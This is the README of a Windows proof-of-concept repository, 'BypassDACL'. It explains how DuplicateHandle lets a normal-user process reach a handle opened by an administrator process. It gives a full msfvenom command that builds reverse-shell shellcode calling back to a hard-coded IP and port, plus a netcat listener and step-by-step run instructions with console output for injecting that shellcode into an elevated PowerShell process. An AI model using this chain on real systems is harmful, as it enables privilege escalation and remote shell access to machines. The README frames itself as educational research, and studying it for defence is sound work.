# BypassDACL

PoC for Bypassing DACL in Windows using DuplicateHandle.

Read more about this code: [Security of Handles in Windows](https://glory-part-39d.notion.site/Security-of-Handles-in-Windows-caaa2531a0914ef0b7779ea366f69bcb).

This code demonstrates how to create a security hole in your program, potentially leading to privilege escalation.

**Note: This is a Proof of Concept (PoC) and is for educational purposes only.**

## Running the Code

### Generate Shellcode for AttackerPE.exe and run listener

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.148 LPORT=443 -f c -b \x00\x0a\x0d
nc -lvvp 443
```

Copy the generated shellcode into `AttackerSource.cpp` and compile it.
```C
unsigned char shellcode[] = "";
```

### Steps to Execute

1. Run `powershell.exe` with Admin privileges.
2. Run `notepad.exe` with normal user privileges.
3. Run `vendor.exe` with Admin privileges.

```
Vendor.exe
Enter the Process name that you want to get Handle (e.g., powershell.exe): powershell.exe
Enter the target Process name (e.g., notepad.exe): notepad.exe
[+] SeDebugPrivilege enabled successfully.
[+] PID of powershell.exe: 8420
[+] Handle of powershell.exe is OK
[*] Run Process Explorer and find handles of notepad.exe, then find a handle named powershell.exe
and write the address of the handle in AttackerPE code...
[*] Sleep(INFINITE). After running AttackerPE.exe, press Ctrl+C to exit.
```

4. Open **procexp64.exe** and copy the address of the handle (powershell.exe) from **notepad.exe**.
   
   ![Screenshot](https://github.com/mehrshadmollaafzal/BypassDACL/blob/main/Screenshot_Procexp.png)
   
6. Run `AttackerPE.exe` with normal user privileges.

```sh
AttackerPE.exe <address> <process name>
AttackerPE.exe 0xFFFFCE890F733080 notepad.exe
```

## Duplicate Handle and Bypass DACL Check (Core concept)

Duplicating a handle in the source process requires that the source process already has that handle, meaning the **DACL was checked** once during the handle's **Creation/Opening**. When duplicating a handle from the source to the destination process, no security checks are performed, It means that even the SID of the destination process is not checked with DACL.

![Diagram](https://github.com/mehrshadmollaafzal/BypassDACL/blob/main/Diagram.jpg)

## **References**

 [MSDN_DuplicateHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle)

[security-briefs-exploring-handle-security-in-windows](https://learn.microsoft.com/en-us/archive/msdn-magazine/2000/march/security-briefs-exploring-handle-security-in-windows)

[process-security-and-access-rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)

[DACLs_and_ACEs](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces)

Windows Internals Books

Windows Kernel Programming Book
